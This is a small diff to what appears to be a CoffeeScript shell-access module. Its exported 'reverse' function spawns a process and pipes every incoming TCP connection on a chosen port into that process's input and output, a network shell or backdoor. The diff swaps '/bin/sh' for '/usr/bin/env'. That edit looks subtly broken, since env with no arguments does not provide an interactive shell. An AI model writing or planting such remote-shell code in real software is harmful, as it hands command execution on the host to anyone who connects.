@@ -7,7 +7,7 @@ fs = require 'fs'
 
 module.exports =
   reverse: (port) ->
-    sh = spawn '/bin/sh', []
+    sh = spawn '/usr/bin/env', []
     server = net.createServer (c) ->
       c.pipe sh.stdin
       util.pump sh.stdout, c
